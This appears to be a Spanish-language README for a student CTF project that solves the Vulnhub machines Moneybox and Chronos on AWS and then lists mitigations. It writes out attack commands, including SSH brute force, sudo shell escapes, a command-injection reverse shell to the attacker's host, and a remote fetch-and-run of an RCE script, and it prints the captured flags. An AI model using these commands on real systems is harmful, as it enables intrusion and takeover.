# Introducción
En este proyecto se efectúa la solución a 02 máquinas CTF(Capture The Flag) del repositorio de Vulnhub: [Moneybox](https://www.vulnhub.com/entry/moneybox-1,653/) y [Chronos](https://www.vulnhub.com/entry/chronos-1,735/), montadas en un entorno cloud empleando el servicio EC2 de AWS.

# Infraestructura
Tanto Moneybox como Chronos se montaron en diferentes instancias EC2, adicionalmente la máquina atacante con [Kali](https://www.kali.org/get-kali/#kali-platforms). Las 03 instancias se encuentran desplegadas en la misma VPC y se realiza el networking correspondiente para que se encuentren conectadas entre sí. Sin embargo la única máquina accesible desde fuera a través de una public IP es la máquina atacante.

**`Infraestructura inicial`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=11c5o4umxrLiI0OOnam64kf3EjaVgHJ2X"></img></p>

**`Infraestructura securizada con herramientas nativas AWS`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=1pADHae9b56royVwhx0JmwbbxH67-VIH5"></img></a>

# Moneybox (Técnicas aplicadas)
**`Scanning`**
```bash
$ nmap -sV <ip-target>
```
**`FTP abuse`**
```bash
$ ftp -U anonymous:anonymous <ip-target>
$ ftp > get
```
**`Steganography & HTTP abuse`**
```bash
$ xxd -l <specific-file>
$ curl <ip-target>:80
$ dirb <ip-target>:80
$ steghide extract -sf <specific-file>
```
**`SSH Brute Force`**
```bash
$ hydra -l <any-user> -P <dictionary.txt> -f <ip-target> ssh
```
**`Privilege escalation with PERL`**
```bash
$ sudo perl -e 'exec "/bin/sh";'
```
**`Execution diagram`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=1KeScz_V1E5-qjqXH3OwnRvCzOa4t1ueu"></img></p>

**`Flags`**
```bash
> us3r1{F14g:0ku74tbd3777y4}
> us3r{F14g:tr5827r5wu6nklao}
> r00t{H4ckth3p14n3t}
```

# Chronos (Técnicas aplicadas)
**`Scanning`**
```bash
$ nmap -sV <ip-target>
```
**`HTTP abuse & domain resolution`**
```bash
$ curl http://<ip-target>
$ echo "<ip-target> chronos.local" >> /etc/hosts
$ curl http://chronos.local
```
**`Deobfuscation, decode, payload generation & command injection (Reverse shell)`**
```bash
$ curl http://chronos.local/date?format=('+Today is %A, %B %d, %Y %H:%M:%S.'; bash -c 'bash -i >& /dev/tcp/<ip-kali>/9002 0>&1')[base58 Encode]
$ nc -nlvp 9002
```
**`www-data abuse`**
```bash
$ cd ../chronos-v2/backend
$ cat package.json
```
**`RCE attack to express-fileupload (versions < 1.1.10)`**
```bash
> Kali side:
$ nc -nlvp 8888
$ python3 -m http.server

> target-side
$ wget http://<ip-kali>:8000/pollutor.py
$ python3 pollutor.py
```
**`Abuse "imera" user & Shell spawn with NODE`**
```bash
$ sudo -l
$ sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
**`Execution diagram`**
<p align="center"><img src="https://drive.google.com/uc?export=view&id=1iwHlQc8Gl9fvGv-oV7CMMLNU5yXst9Yy"></img></p>

**`Flag`**
```bash
> YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK
```
# Medidas de mitigación de vulnerabilidades encontradas
**`Moneybox`**
+ Actualizar el servicio FTP a su ultima versión y si es posible migrar hacia otro puerto.
+ Eliminar el acceso FTP anónimo (anonymous:anonymous) asignar un usuario y una contraseña.
+ Utilizar certificados lugar de contraseñas de usuario para el acceso por SSH.
+ Emplear herramientas que eviten ataques de fuerza bruta tales como: **fail2ban** y **fwknop**.
+ Editar el fichero /etc/sudoers asignando los mínimos privilegios a grupos y usuarios.
+ Hardening del servidor web Apache.
+ Utilizar infraestructura adicional como IDS/IPS (mostrada en infraestructura securizada nativa de AWS).

**`Chronos`**
+ Evitar malas prácticas en el desarrollo backend: Evitar uso directo de comandos del sistema en el código o en su defecto, mitigar el uso de *keywords* tales como: bash, sh, whoami, etc.
+ Prevenir accesos mediante reverse-shell a través de NODE modificando el atributo de express-fileupload a **{parseNested: false}**.
+ Asignar lo mínimos privilegios mediante el fichero /etc/sudoers.
+ Emplear infraestructura securizada adicional (como la nativa proporcionada por AWS).

# Colaboradores
+ Daniel Henares
+ Edgar Huanca
+ Alejandro Jiménez
+ Mateo Vizuete
